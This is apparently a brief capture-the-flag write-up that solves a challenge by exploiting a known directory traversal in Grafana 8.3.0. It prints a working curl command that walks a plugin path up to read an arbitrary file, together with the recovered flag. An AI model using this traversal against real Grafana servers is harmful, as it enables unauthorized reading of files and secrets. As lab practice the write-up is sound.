Observe that Grafana is version 8.3.0 (at the bottom of the page), and search for exploits for this version on Google.

Find "Grafana 8.3.0 - Directory Traversal and Arbitrary File Read" on exploit-db:
https://www.exploit-db.com/exploits/50581

Perform the exploit using `curl` and get the flag:
```
└─$ curl "http://<domain>:<port>/public/plugins/alertlist/../../../../../../../../../../../../../flag/flag.txt" --path-as-is
SUCTF{y37_4n07h3r_6r4f4n4_vuln3r4b1l17y}
```

Flag: `SUCTF{y37_4n07h3r_6r4f4n4_vuln3r4b1l17y}`
